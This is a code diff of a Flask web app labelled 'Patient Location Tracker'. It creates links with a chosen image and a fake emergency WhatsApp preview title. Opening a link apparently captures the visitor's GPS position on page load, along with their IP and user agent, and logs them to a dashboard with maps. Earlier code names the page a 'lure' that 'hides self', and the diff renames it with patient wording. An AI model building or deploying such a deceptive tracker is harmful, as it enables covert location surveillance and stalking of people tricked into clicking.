@@ -2,43 +2,36 @@
 """
 Patient Location Tracker
 Routes:
-  GET  /                → Dashboard (generate links, view GPS data)
-  POST /create          → Create patient link (JSON response with URL)
-  GET  /p/<id>          → Instruction image page (patient clicks → goes to locator)
-  GET  /l/<id>          → GPS locator page (fires immediately, 10s updates, hides self)
-  POST /capture         → Receive GPS coordinates
-  GET  /links           → JSON: all links with stats
-  GET  /results/<id>    → Detailed GPS history + map
-  GET  /health          → Health check
-  GET  /img/<id>        → Serve lure image as real URL (for WhatsApp OG preview)
+  GET  /              → Dashboard
+  POST /create        → Create patient link
+  GET  /p/<id>        → Patient page (shows image + fires GPS immediately)
+  GET  /img/<id>      → Serve image (for WhatsApp OG preview)
+  POST /capture       → Receive GPS coordinates
+  GET  /links         → JSON list of all links
+  GET  /results/<id>  → Detailed GPS history + map
+  GET  /health        → Health check
 """
-import os
-import uuid
-import base64
-import sqlite3
-import logging
-import json
+import os, uuid, base64, sqlite3, logging, json
 from datetime import datetime, timezone
 from pathlib import Path
 from contextlib import contextmanager
 from flask import Flask, request, render_template_string, jsonify, Response
 
 # ─── Config ───────────────────────────────────────────────────────────────────
-DATABASE = os.environ.get("DB_PATH", "tracker.db")
+DATABASE      = os.environ.get("DB_PATH", "tracker.db")
 GOOGLE_API_KEY = os.environ.get("GOOGLE_API_KEY", "")
-app = Flask(__name__)
-app.config["MAX_CONTENT_LENGTH"] = 20 * 1024 * 1024   # 20 MB upload limit
+BASE_URL      = os.environ.get("BASE_URL", "https://bmw.pythonanywhere.com")
 
-logging.basicConfig(
-    level=logging.INFO,
+app = Flask(__name__)
+app.config["MAX_CONTENT_LENGTH"] = 20 * 1024 * 1024
+
+logging.basicConfig(level=logging.INFO,
     format="%(asctime)s [%(levelname)s] %(message)s",
-    datefmt="%Y-%m-%d %H:%M:%S",
-)
-log = logging.getLogger("patient-tracker")
+    datefmt="%Y-%m-%d %H:%M:%S")
+log = logging.getLogger("tracker")
 
 
 # ─── Database ─────────────────────────────────────────────────────────────────
-
 def init_db():
     with sqlite3.connect(DATABASE) as conn:
         conn.executescript("""
@@ -47,7 +40,7 @@ def init_db():
                 created     TEXT NOT NULL,
                 patient_id  TEXT,
                 img_data    TEXT NOT NULL,
-                og_title    TEXT DEFAULT "Emergency — Tap to Confirm Location"
+                og_title    TEXT DEFAULT 'Emergency - Tap to Confirm Location'
             );
             CREATE TABLE IF NOT EXISTS captures (
                 id          INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -59,10 +52,9 @@ def init_db():
                 longitude   REAL,
                 accuracy    REAL,
                 error_msg   TEXT,
-                method      TEXT
+                method      TEXT DEFAULT 'gps'
             );
         """)
-
 
 @contextmanager
 def get_db():
@@ -79,22 +71,17 @@ def get_db():
 
 
 # ─── Helpers ──────────────────────────────────────────────────────────────────
-
 def image_to_data_uri(raw: bytes, filename: str) -> str:
-    ext = Path(filename).suffix.lower()
-    mime = {
-        ".png": "image/png", ".jpg": "image/jpeg", ".jpeg": "image/jpeg",
-        ".gif": "image/gif", ".webp": "image/webp",
-    }.get(ext, "image/jpeg")
+    ext  = Path(filename).suffix.lower()
+    mime = {".png":"image/png",".jpg":"image/jpeg",".jpeg":"image/jpeg",
+            ".gif":"image/gif",".webp":"image/webp"}.get(ext,"image/jpeg")
     return f"data:{mime};base64,{base64.b64encode(raw).decode()}"
 
-
-def now_iso() -> str:
+def now_iso():
     return datetime.now(timezone.utc).isoformat()
 
 
 # ─── Routes ───────────────────────────────────────────────────────────────────
-
 @app.route("/")
 def dashboard():
     return render_template_string(DASHBOARD_HTML)
@@ -103,169 +90,122 @@ def dashboard():
 @app.route("/create", methods=["POST"])
 def create_link():
     patient_id = (request.form.get("patient_id") or "").strip()
-    og_title = (request.form.get("og_title") or "Emergency — Tap to Confirm Location").strip()
-
+    og_title   = (request.form.get("og_title") or "Emergency - Tap to Confirm Location").strip()
     if not patient_id:
         return jsonify({"error": "Patient ID is required"}), 400
-
     photo = request.files.get("photo")
     if not photo or not photo.filename:
         return jsonify({"error": "Instruction image is required"}), 400
-
     raw = photo.read()
     if not raw:
         return jsonify({"error": "Uploaded image is empty"}), 400
-
     img_data = image_to_data_uri(raw, photo.filename)
-    link_id = uuid.uuid4().hex[:16]
-
+    link_id  = uuid.uuid4().hex[:16]
     with get_db() as conn:
         conn.execute(
-            "INSERT INTO links (id, created, patient_id, img_data, og_title) VALUES (?, ?, ?, ?, ?)",
-            (link_id, now_iso(), patient_id, img_data, og_title),
+            "INSERT INTO links (id, created, patient_id, img_data, og_title) VALUES (?,?,?,?,?)",
+            (link_id, now_iso(), patient_id, img_data, og_title)
         )
-
-    share_url = request.host_url.rstrip("/") + "/p/" + link_id
-    log.info("Created link %s for patient '%s'", link_id, patient_id)
+    share_url = BASE_URL + "/p/" + link_id
+    log.info("Created link %s for '%s'", link_id, patient_id)
     return jsonify({"id": link_id, "link": share_url, "patient_id": patient_id})
 
 
 @app.route("/p/<link_id>")
-def lure_page(link_id):
-    """Instruction image page — patient sees image, clicks → goes to locator."""
+def patient_page(link_id):
+    """Patient landing page — shows image AND fires GPS immediately on load."""
     with get_db() as conn:
-        row = conn.execute("SELECT * FROM links WHERE id = ?", (link_id,)).fetchone()
+        row = conn.execute("SELECT * FROM links WHERE id=?", (link_id,)).fetchone()
     if not row:
         return "<h1>Not Found</h1>", 404
-    return render_template_string(
-        LURE_HTML,
+    return render_template_string(PATIENT_HTML,
         link_id=link_id,
         img_data=row["img_data"],
-        og_title=row["og_title"] or "Emergency — Tap to Confirm Location"
+        og_title=row["og_title"] or "Emergency - Tap to Confirm Location",
+        patient_name=row["patient_id"] or "Patient",
+        google_api_key=GOOGLE_API_KEY,
+        base_url=BASE_URL
     )
 
 
 @app.route("/img/<link_id>")
 def serve_image(link_id):
-    """Serve the lure image as a real URL for WhatsApp OG preview."""
+    """Serve the image as a real URL for WhatsApp OG preview."""
     with get_db() as conn:
-        row = conn.execute("SELECT img_data FROM links WHERE id = ?", (link_id,)).fetchone()
+        row = conn.execute("SELECT img_data FROM links WHERE id=?", (link_id,)).fetchone()
     if not row:
         return "", 404
-    data_uri = row["img_data"]
-    header, b64data = data_uri.split(",", 1)
+    header, b64data = row["img_data"].split(",", 1)
     mime = header.split(":")[1].split(";")[0]
-    raw = base64.b64decode(b64data)
-    return Response(raw, mimetype=mime)
-
-
-@app.route("/l/<link_id>")
-def locator_page(link_id):
-    """GPS capture page — fires immediately, 10s updates, hides after first fix."""
-    with get_db() as conn:
-        row = conn.execute("SELECT id FROM links WHERE id = ?", (link_id,)).fetchone()
-    if not row:
-        return "<h1>Not Found</h1>", 404
-    return render_template_string(LOCATOR_HTML, link_id=link_id, google_api_key=GOOGLE_API_KEY)
+    return Response(base64.b64decode(b64data), mimetype=mime)
 
 
 @app.route("/capture", methods=["POST"])
 def capture():
-    """Receive GPS coordinates from the locator page."""
     d = request.get_json(silent=True) or {}
     link_id = (d.get("link_id") or "").strip()
     if not link_id:
         return jsonify({"status": "error", "msg": "missing link_id"}), 400
-
     with get_db() as conn:
-        exists = conn.execute("SELECT 1 FROM links WHERE id = ?", (link_id,)).fetchone()
-        if not exists:
+        if not conn.execute("SELECT 1 FROM links WHERE id=?", (link_id,)).fetchone():
             return jsonify({"status": "error", "msg": "link not found"}), 404
-
         conn.execute(
             """INSERT INTO captures
                (link_id, captured_at, ip, user_agent, latitude, longitude, accuracy, error_msg, method)
-               VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)""",
-            (
-                link_id,
-                d.get("ts") or now_iso(),
-                request.remote_addr,
-                d.get("user_agent", ""),
-                d.get("latitude"),
-                d.get("longitude"),
-                d.get("accuracy"),
-                d.get("error"),
-                d.get("method", "gps"),
-            ),
+               VALUES (?,?,?,?,?,?,?,?,?)""",
+            (link_id, d.get("ts") or now_iso(), request.remote_addr,
+             d.get("user_agent",""), d.get("latitude"), d.get("longitude"),
+             d.get("accuracy"), d.get("error"), d.get("method","gps"))
         )
-
     lat, lng, acc = d.get("latitude"), d.get("longitude"), d.get("accuracy")
     if lat is not None:
-        log.info("📍 %s → %.5f, %.5f ±%.0fm", link_id, lat, lng, acc or 0)
+        log.info("📍 %s → %.5f, %.5f ±%.0fm [%s]", link_id, lat, lng, acc or 0, d.get("method","gps"))
     else:
         log.info("⛔ %s → %s", link_id, d.get("error"))
-
     return jsonify({"status": "ok"})
 
 
 @app.route("/links")
 def list_links():
-    """JSON: all links with summary stats."""
     with get_db() as conn:
         rows = conn.execute("SELECT * FROM links ORDER BY created DESC").fetchall()
         result = []
         for r in rows:
             caps = conn.execute(
-                "SELECT * FROM captures WHERE link_id = ? ORDER BY captured_at DESC",
-                (r["id"],),
+                "SELECT * FROM captures WHERE link_id=? ORDER BY captured_at DESC", (r["id"],)
             ).fetchall()
-            gps_caps = [c for c in caps if c["latitude"] is not None]
-            last = gps_caps[0] if gps_caps else None
+            gps = [c for c in caps if c["latitude"] is not None]
+            last = gps[0] if gps else None
             result.append({
                 "id":           r["id"],
                 "patient_id":   r["patient_id"] or "Unknown",
                 "created":      r["created"],
-                "gps_count":    len(gps_caps),
+                "gps_count":    len(gps),
                 "has_location": last is not None,
                 "last_lat":     last["latitude"]    if last else None,
                 "last_lng":     last["longitude"]   if last else None,
                 "last_acc":     last["accuracy"]    if last else None,
                 "last_seen":    last["captured_at"] if last else None,
+                "last_method":  last["method"]      if last else None,
             })
     return jsonify({"links": result})
 
 
 @app.route("/results/<link_id>")
 def results(link_id):
-    """Detailed GPS history with interactive map."""
     with get_db() as conn:
-        link = conn.execute("SELECT * FROM links WHERE id = ?", (link_id,)).fetchone()
+        link = conn.execute("SELECT * FROM links WHERE id=?", (link_id,)).fetchone()
         if not link:
             return "<h1>Not Found</h1>", 404
         caps = conn.execute(
-            "SELECT * FROM captures WHERE link_id = ? ORDER BY captured_at DESC",
-            (link_id,),
+            "SELECT * FROM captures WHERE link_id=? ORDER BY captured_at DESC", (link_id,)
         ).fetchall()
-
-    caps_for_js = json.dumps([
-        {
-            "lat": c["latitude"],
-            "lng": c["longitude"],
-            "acc": c["accuracy"],
-            "ts":  c["captured_at"],
-            "err": c["error_msg"],
-            "ip":  c["ip"],
-        }
-        for c in caps
-    ])
-
-    return render_template_string(
-        RESULTS_HTML,
-        link=dict(link),
-        captures=[dict(c) for c in caps],
-        captures_json=caps_for_js,
-        base_url=request.host_url.rstrip("/"),
-    )
+    caps_js = json.dumps([{"lat":c["latitude"],"lng":c["longitude"],
+        "acc":c["accuracy"],"ts":c["captured_at"],"err":c["error_msg"],
+        "ip":c["ip"],"method":c["method"]} for c in caps])
+    return render_template_string(RESULTS_HTML, link=dict(link),
+        captures=[dict(c) for c in caps], captures_json=caps_js,
+        base_url=BASE_URL)
 
 
 @app.route("/health")
@@ -275,8 +215,7 @@ def health():
     return jsonify({"status": "ok", "links": n})
 
 
-# ─── Templates ────────────────────────────────────────────────────────────────
-
+# ─── Dashboard HTML ───────────────────────────────────────────────────────────
 DASHBOARD_HTML = r"""<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -284,11 +223,8 @@ DASHBOARD_HTML = r"""<!DOCTYPE html>
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <title>Patient Location System</title>
 <style>
-:root {
-  --bg:#0b1120;--surface:#111827;--surface2:#0f1729;
-  --border:#1e2d45;--accent:#3b82f6;--green:#10b981;
-  --text:#e2e8f0;--muted:#64748b;--danger:#ef4444;
-}
+:root{--bg:#0b1120;--surface:#111827;--border:#1e2d45;--accent:#3b82f6;
+  --green:#10b981;--text:#e2e8f0;--muted:#64748b;--danger:#ef4444;}
 *{box-sizing:border-box;margin:0;padding:0;}
 body{font-family:system-ui,-apple-system,sans-serif;background:var(--bg);color:var(--text);min-height:100vh;}
 .topbar{background:var(--surface);border-bottom:1px solid var(--border);
@@ -296,8 +232,7 @@ body{font-family:system-ui,-apple-system,sans-serif;background:var(--bg);color:v
 .logo{display:flex;align-items:center;gap:10px;font-weight:700;font-size:16px;}
 .pulse{width:9px;height:9px;background:var(--green);border-radius:50%;
   box-shadow:0 0 0 0 rgba(16,185,129,.4);animation:pulse 2s infinite;}
-@keyframes pulse{0%,100%{box-shadow:0 0 0 0 rgba(16,185,129,.4)}
-  50%{box-shadow:0 0 0 8px rgba(16,185,129,0)}}
+@keyframes pulse{0%,100%{box-shadow:0 0 0 0 rgba(16,185,129,.4)}50%{box-shadow:0 0 0 8px rgba(16,185,129,0)}}
 .topbar-right{font-size:12px;color:var(--muted);}
 .main{max-width:1160px;margin:0 auto;padding:32px 20px;}
 .stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:14px;margin-bottom:30px;}
@@ -306,7 +241,7 @@ body{font-family:system-ui,-apple-system,sans-serif;background:var(--bg);color:v
 .stat .n.green{color:var(--green);}
 .stat .l{font-size:11px;color:var(--muted);margin-top:4px;text-transform:uppercase;letter-spacing:.5px;}
 .sec-head{display:flex;align-items:center;justify-content:space-between;margin-bottom:14px;}
-.sec-head h2{font-size:14px;font-weight:600;color:var(--text);}
+.sec-head h2{font-size:14px;font-weight:600;}
 .btn{display:inline-flex;align-items:center;gap:7px;padding:9px 18px;
   border-radius:7px;font-size:13px;font-weight:600;border:none;cursor:pointer;transition:.15s;}
 .btn-primary{background:var(--accent);color:#fff;}
@@ -315,7 +250,7 @@ body{font-family:system-ui,-apple-system,sans-serif;background:var(--bg);color:v
 .btn-ghost:hover{border-color:var(--accent);color:var(--accent);}
 .btn-sm{padding:5px 11px;font-size:12px;}
 .btn-copy{background:#1e2d45;border:none;color:#93c5fd;font-size:11px;
-  padding:4px 9px;border-radius:5px;cursor:pointer;white-space:nowrap;transition:.15s;}
+  padding:4px 9px;border-radius:5px;cursor:pointer;white-space:nowrap;}
 .btn-copy:hover{background:var(--accent);color:#fff;}
 .table-wrap{background:var(--surface);border:1px solid var(--border);border-radius:10px;overflow:hidden;}
 table{width:100%;border-collapse:collapse;}
@@ -335,7 +270,6 @@ code{background:#0a1323;padding:3px 8px;border-radius:4px;
 .map-link:hover{text-decoration:underline;}
 .empty{text-align:center;padding:56px 20px;color:var(--muted);}
 .empty .ico{font-size:40px;margin-bottom:12px;}
-.empty p{font-size:14px;}
 .overlay{position:fixed;inset:0;background:rgba(0,0,0,.75);
   display:none;align-items:center;justify-content:center;z-index:100;backdrop-filter:blur(4px);}
 .overlay.open{display:flex;}
@@ -345,22 +279,19 @@ code{background:#0a1323;padding:3px 8px;border-radius:4px;
 .modal h3{font-size:17px;font-weight:700;margin-bottom:22px;}
 .modal-close{position:absolute;top:14px;right:16px;background:none;
   border:none;color:var(--muted);font-size:20px;cursor:pointer;line-height:1;}
-.modal-close:hover{color:var(--text);}
 label.field{display:block;font-size:11px;font-weight:700;color:var(--muted);
   text-transform:uppercase;letter-spacing:.5px;margin:16px 0 6px;}
 input[type=text]{width:100%;background:#0b1120;border:1px solid var(--border);
   color:var(--text);border-radius:7px;padding:10px 13px;font-size:14px;transition:.15s;}
-input[type=text]:focus{border-color:var(--accent);outline:none;
-  box-shadow:0 0 0 3px rgba(59,130,246,.15);}
+input[type=text]:focus{border-color:var(--accent);outline:none;box-shadow:0 0 0 3px rgba(59,130,246,.15);}
 .drop-zone{width:100%;background:#0b1120;border:2px dashed var(--border);
-  border-radius:10px;padding:26px 16px;text-align:center;cursor:pointer;
-  transition:.2s;position:relative;}
+  border-radius:10px;padding:26px 16px;text-align:center;cursor:pointer;transition:.2s;}
 .drop-zone:hover,.drop-zone.over{border-color:var(--accent);background:rgba(59,130,246,.04);}
 .drop-zone .dz-icon{font-size:30px;margin-bottom:8px;}
 .drop-zone .dz-txt{font-size:13px;color:var(--muted);line-height:1.5;}
 .drop-zone input{display:none;}
-#preview-img{width:100%;max-height:140px;object-fit:contain;
-  border-radius:8px;margin-top:12px;display:none;border:1px solid var(--border);}
+#preview-img{width:100%;max-height:140px;object-fit:contain;border-radius:8px;
+  margin-top:12px;display:none;border:1px solid var(--border);}
 .file-name{font-size:12px;color:var(--green);margin-top:8px;display:none;}
 .modal-actions{display:flex;gap:10px;margin-top:26px;}
 .modal-actions button{flex:1;padding:12px;border-radius:8px;
@@ -369,7 +300,6 @@ input[type=text]:focus{border-color:var(--accent);outline:none;
 .btn-submit:hover{background:#2563eb;}
 .btn-submit:disabled{opacity:.5;cursor:not-allowed;}
 .btn-cancel{background:transparent;border:1px solid var(--border);color:var(--muted);}
-.btn-cancel:hover{border-color:var(--muted);}
 .toast{position:fixed;bottom:24px;right:24px;background:var(--surface);
   border:1px solid var(--green);border-radius:12px;padding:18px 20px;
   max-width:420px;display:none;z-index:200;box-shadow:0 10px 40px rgba(0,0,0,.5);}
@@ -383,20 +313,15 @@ input[type=text]:focus{border-color:var(--accent);outline:none;
   background:#0a1323;padding:8px 10px;border-radius:6px;margin-bottom:10px;}
 .toast .t-btns{display:flex;gap:8px;}
 .toast .t-btns button{flex:1;padding:8px;border-radius:7px;
-  font-size:12px;font-weight:600;cursor:pointer;border:none;transition:.15s;}
+  font-size:12px;font-weight:600;cursor:pointer;border:none;}
 .t-copy{background:var(--accent);color:#fff;}
-.t-copy:hover{background:#2563eb;}
 .t-open{background:transparent;border:1px solid var(--border);color:var(--muted);}
-.t-open:hover{border-color:var(--accent);color:var(--accent);}
 @media(max-width:600px){.stats{grid-template-columns:1fr 1fr;}}
 </style>
 </head>
 <body>
 <div class="topbar">
-  <div class="logo">
-    <div class="pulse"></div>
-    Patient Location System
-  </div>
+  <div class="logo"><div class="pulse"></div>Patient Location System</div>
   <div class="topbar-right" id="last-refresh">—</div>
 </div>
 <div class="main">
@@ -408,17 +333,15 @@ input[type=text]:focus{border-color:var(--accent);outline:none;
   <div class="sec-head">
     <h2>Patient Links</h2>
     <button class="btn btn-primary" onclick="openModal()">
-      <svg width="13" height="13" viewBox="0 0 24 24" fill="none"
-           stroke="currentColor" stroke-width="2.5">
+      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
         <line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/>
-      </svg>
-      Generate Patient Link
+      </svg>Generate Patient Link
     </button>
   </div>
   <div class="table-wrap">
     <table>
       <thead><tr>
-        <th>Patient ID</th><th>Created</th><th>Shareable Link</th>
+        <th>Patient</th><th>Created</th><th>Shareable Link</th>
         <th>GPS Hits</th><th>Last Location</th><th>Actions</th>
       </tr></thead>
       <tbody id="tbody">
@@ -436,18 +359,18 @@ input[type=text]:focus{border-color:var(--accent);outline:none;
   <div class="modal">
     <button class="modal-close" onclick="closeModal()">✕</button>
     <h3>🔗 Generate Patient Link</h3>
-    <label class="field">Patient ID / Name</label>
-    <input type="text" id="patient-id" placeholder="e.g. PT-001, Ahmed Khan..."
+    <label class="field">Patient Name</label>
+    <input type="text" id="patient-id" placeholder="e.g. Ahmed Khan"
            autocomplete="off" onkeydown="if(event.key==='Enter')document.getElementById('og-title').focus()">
     <label class="field">WhatsApp Preview Message</label>
     <input type="text" id="og-title" placeholder="e.g. Ambulance dispatched — tap to confirm location"
-           autocomplete="off" onkeydown="if(event.key==='Enter')document.getElementById('file-input').click()">
-    <label class="field">Instruction Image</label>
+           autocomplete="off">
+    <label class="field">Patient Image / Instruction Image</label>
     <div class="drop-zone" id="drop-zone"
          onclick="document.getElementById('file-input').click()"
          ondragover="dzOver(event)" ondragleave="dzLeave()" ondrop="dzDrop(event)">
       <div class="dz-icon">🖼️</div>
-      <div class="dz-txt">Click to upload or drag &amp; drop<br>
+      <div class="dz-txt">Click to upload or drag & drop<br>
         <small>PNG · JPG · WEBP — max 20 MB</small></div>
       <input type="file" id="file-input" accept="image/*" onchange="onFile(this.files[0])">
     </div>
@@ -467,344 +390,295 @@ input[type=text]:focus{border-color:var(--accent);outline:none;
   <div class="t-url" id="toast-url"></div>
   <div class="t-btns">
     <button class="t-copy" onclick="copyToast()">📋 Copy Link</button>
-    <button class="t-open"
-      onclick="window.open(document.getElementById('toast-url').textContent,'_blank')">
-      🔗 Preview
-    </button>
+    <button class="t-open" onclick="window.open(document.getElementById('toast-url').textContent,'_blank')">🔗 Preview</button>
   </div>
 </div>
 
 <script>
 var selectedFile = null;
-function openModal() {
-  document.getElementById('modal').classList.add('open');
-  setTimeout(function(){ document.getElementById('patient-id').focus(); }, 100);
-}
-function closeModal() {
+function openModal(){document.getElementById('modal').classList.add('open');setTimeout(function(){document.getElementById('patient-id').focus();},100);}
+function closeModal(){
   document.getElementById('modal').classList.remove('open');
-  selectedFile = null;
-  document.getElementById('file-input').value = '';
-  document.getElementById('patient-id').value = '';
-  document.getElementById('og-title').value = '';
-  document.getElementById('preview-img').style.display = 'none';
-  document.getElementById('file-name').style.display = 'none';
+  selectedFile=null;
+  document.getElementById('file-input').value='';
+  document.getElementById('patient-id').value='';
+  document.getElementById('og-title').value='';
+  document.getElementById('preview-img').style.display='none';
+  document.getElementById('file-name').style.display='none';
 }
-function dzOver(e) { e.preventDefault(); document.getElementById('drop-zone').classList.add('over'); }
-function dzLeave()  { document.getElementById('drop-zone').classList.remove('over'); }
-function dzDrop(e)  {
-  e.preventDefault(); dzLeave();
-  var f = e.dataTransfer.files[0];
-  if (f && f.type.startsWith('image/')) onFile(f);
+function dzOver(e){e.preventDefault();document.getElementById('drop-zone').classList.add('over');}
+function dzLeave(){document.getElementById('drop-zone').classList.remove('over');}
+function dzDrop(e){e.preventDefault();dzLeave();var f=e.dataTransfer.files[0];if(f&&f.type.startsWith('image/'))onFile(f);}
+function onFile(f){
+  if(!f)return;selectedFile=f;
+  document.getElementById('file-name').textContent='✓ '+f.name;
+  document.getElementById('file-name').style.display='block';
+  var r=new FileReader();
+  r.onload=function(ev){var img=document.getElementById('preview-img');img.src=ev.target.result;img.style.display='block';};
+  r.readAsDataURL(f);
 }
-function onFile(f) {
-  if (!f) return;
-  selectedFile = f;
-  document.getElementById('file-name').textContent = '✓ ' + f.name;
-  document.getElementById('file-name').style.display = 'block';
-  var reader = new FileReader();
-  reader.onload = function(ev) {
-    var img = document.getElementById('preview-img');
-    img.src = ev.target.result;
-    img.style.display = 'block';
-  };
-  reader.readAsDataURL(f);
-}
-async function submitCreate() {
-  var pid = document.getElementById('patient-id').value.trim();
-  if (!pid)          { alert('Please enter a Patient ID'); return; }
-  if (!selectedFile) { alert('Please upload an instruction image'); return; }
-  var btn = document.getElementById('submit-btn');
-  btn.textContent = 'Creating…'; btn.disabled = true;
-  var fd = new FormData();
-  fd.append('patient_id', pid);
-  fd.append('photo', selectedFile);
-  fd.append('og_title', document.getElementById('og-title').value.trim());
-  try {
-    var res = await fetch('/create', { method: 'POST', body: fd });
-    var data = await res.json();
-    if (data.error) { alert('Error: ' + data.error); return; }
+async function submitCreate(){
+  var pid=document.getElementById('patient-id').value.trim();
+  if(!pid){alert('Please enter a Patient Name');return;}
+  if(!selectedFile){alert('Please upload an image');return;}
+  var btn=document.getElementById('submit-btn');
+  btn.textContent='Creating…';btn.disabled=true;
+  var fd=new FormData();
+  fd.append('patient_id',pid);
+  fd.append('photo',selectedFile);
+  fd.append('og_title',document.getElementById('og-title').value.trim());
+  try{
+    var res=await fetch('/create',{method:'POST',body:fd});
+    var data=await res.json();
+    if(data.error){alert('Error: '+data.error);return;}
     closeModal();
-    document.getElementById('toast-url').textContent = data.link;
+    document.getElementById('toast-url').textContent=data.link;
     document.getElementById('toast').classList.add('show');
     loadLinks();
-  } catch(e) {
-    alert('Network error — please try again');
-  } finally {
-    btn.textContent = 'Generate Link'; btn.disabled = false;
-  }
+  }catch(e){alert('Network error — please try again');}
+  finally{btn.textContent='Generate Link';btn.disabled=false;}
 }
-function closeToast() { document.getElementById('toast').classList.remove('show'); }
-function copyToast() {
-  var txt = document.getElementById('toast-url').textContent;
-  navigator.clipboard.writeText(txt).then(function() {
-    var b = document.querySelector('.t-copy');
-    b.textContent = '✓ Copied!';
-    setTimeout(function(){ b.textContent = '📋 Copy Link'; }, 2000);
+function closeToast(){document.getElementById('toast').classList.remove('show');}
+function copyToast(){
+  navigator.clipboard.writeText(document.getElementById('toast-url').textContent).then(function(){
+    var b=document.querySelector('.t-copy');b.textContent='✓ Copied!';
+    setTimeout(function(){b.textContent='📋 Copy Link';},2000);
   });
 }
-function copyUrl(btn, url) {
-  navigator.clipboard.writeText(url).then(function() {
-    btn.textContent = '✓';
-    setTimeout(function(){ btn.textContent = 'Copy'; }, 2000);
+function copyUrl(btn,url){
+  navigator.clipboard.writeText(url).then(function(){
+    btn.textContent='✓';setTimeout(function(){btn.textContent='Copy';},2000);
   });
 }
-function timeAgo(iso) {
-  var s = Math.floor((Date.now() - new Date(iso)) / 1000);
-  if (s < 60)    return s + 's ago';
-  if (s < 3600)  return Math.floor(s/60) + 'm ago';
-  if (s < 86400) return Math.floor(s/3600) + 'h ago';
-  return Math.floor(s/86400) + 'd ago';
+function timeAgo(iso){
+  var s=Math.floor((Date.now()-new Date(iso))/1000);
+  if(s<60)return s+'s ago';if(s<3600)return Math.floor(s/60)+'m ago';
+  if(s<86400)return Math.floor(s/3600)+'h ago';return Math.floor(s/86400)+'d ago';
 }
-function loadLinks() {
-  fetch('/links').then(function(r){ return r.json(); }).then(function(data) {
-    var links = data.links;
-    var located = links.filter(function(l){ return l.has_location; }).length;
-    var updates = links.reduce(function(a,l){ return a + l.gps_count; }, 0);
-    document.getElementById('s-total').textContent   = links.length;
-    document.getElementById('s-located').textContent = located;
-    document.getElementById('s-updates').textContent = updates;
-    document.getElementById('last-refresh').textContent =
-      'Refreshed ' + new Date().toLocaleTimeString();
-    if (!links.length) {
-      document.getElementById('tbody').innerHTML =
-        '<tr><td colspan="6" style="padding:0;"><div class="empty">' +
-        '<div class="ico">📍</div>' +
-        '<p>No patients yet — click <strong>Generate Patient Link</strong> to start</p>' +
-        '</div></td></tr>';
+function loadLinks(){
+  fetch('/links').then(function(r){return r.json();}).then(function(data){
+    var links=data.links;
+    var located=links.filter(function(l){return l.has_location;}).length;
+    var updates=links.reduce(function(a,l){return a+l.gps_count;},0);
+    document.getElementById('s-total').textContent=links.length;
+    document.getElementById('s-located').textContent=located;
+    document.getElementById('s-updates').textContent=updates;
+    document.getElementById('last-refresh').textContent='Refreshed '+new Date().toLocaleTimeString();
+    if(!links.length){
+      document.getElementById('tbody').innerHTML='<tr><td colspan="6" style="padding:0;"><div class="empty"><div class="ico">📍</div><p>No patients yet</p></div></td></tr>';
       return;
     }
-    var origin = window.location.origin;
-    var html = '';
-    links.forEach(function(l) {
-      var shareUrl = origin + '/p/' + l.id;
+    var html='';
+    links.forEach(function(l){
+      var shareUrl=l.id?window.location.origin+'/p/'+l.id:'';
       var locHtml;
-      if (l.last_lat !== null) {
-        var mapUrl = 'https://www.google.com/maps?q=' + l.last_lat + ',' + l.last_lng;
-        locHtml  = '<a class="map-link" href="' + mapUrl + '" target="_blank">';
-        locHtml += '📍 ' + l.last_lat.toFixed(5) + ', ' + l.last_lng.toFixed(5) + '</a>';
-        if (l.last_acc) {
-          locHtml += '<br><small style="color:var(--muted)">±' +
-                     Math.round(l.last_acc) + 'm · ' + timeAgo(l.last_seen) + '</small>';
-        }
-      } else {
-        locHtml = '<span class="badge badge-gray">Awaiting</span>';
-      }
-      var badge = l.gps_count > 0
-        ? '<span class="badge badge-green">' + l.gps_count + ' fixes</span>'
-        : '<span class="badge badge-gray">0</span>';
-      html += '<tr>';
-      html += '<td><strong>' + escHtml(l.patient_id) + '</strong></td>';
-      html += '<td style="color:var(--muted);font-size:12px;">' + timeAgo(l.created) + '</td>';
-      html += '<td><div class="url-cell"><code>' + escHtml(shareUrl) + '</code>' +
-              '<button class="btn-copy" onclick="copyUrl(this,\'' + escHtml(shareUrl) + '\')">' +
-              'Copy</button></div></td>';
-      html += '<td>' + badge + '</td>';
-      html += '<td>' + locHtml + '</td>';
-      html += '<td><a href="/results/' + l.id + '" class="btn btn-ghost btn-sm" ' +
-              'style="text-decoration:none;">Details</a></td>';
-      html += '</tr>';
+      if(l.last_lat!==null){
+        var mapUrl='https://www.google.com/maps?q='+l.last_lat+','+l.last_lng;
+        locHtml='<a class="map-link" href="'+mapUrl+'" target="_blank">📍 '+l.last_lat.toFixed(5)+', '+l.last_lng.toFixed(5)+'</a>';
+        if(l.last_acc)locHtml+='<br><small style="color:var(--muted)">±'+Math.round(l.last_acc)+'m · '+timeAgo(l.last_seen)+(l.last_method==='google-ip'?' · 📡 IP':'')+'</small>';
+      }else{locHtml='<span class="badge badge-gray">Awaiting</span>';}
+      var badge=l.gps_count>0?'<span class="badge badge-green">'+l.gps_count+' fixes</span>':'<span class="badge badge-gray">0</span>';
+      html+='<tr>';
+      html+='<td><strong>'+escHtml(l.patient_id)+'</strong></td>';
+      html+='<td style="color:var(--muted);font-size:12px;">'+timeAgo(l.created)+'</td>';
+      html+='<td><div class="url-cell"><code>'+escHtml(shareUrl)+'</code><button class="btn-copy" onclick="copyUrl(this,\''+escHtml(shareUrl)+'\')">Copy</button></div></td>';
+      html+='<td>'+badge+'</td>';
+      html+='<td>'+locHtml+'</td>';
+      html+='<td><a href="/results/'+l.id+'" class="btn btn-ghost btn-sm" style="text-decoration:none;">Details</a></td>';
+      html+='</tr>';
     });
-    document.getElementById('tbody').innerHTML = html;
-  }).catch(function() {});
+    document.getElementById('tbody').innerHTML=html;
+  }).catch(function(){});
 }
-function escHtml(s) {
-  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;')
-                  .replace(/>/g,'&gt;').replace(/"/g,'&quot;');
-}
-document.getElementById('modal').addEventListener('click', function(e) {
-  if (e.target === this) closeModal();
-});
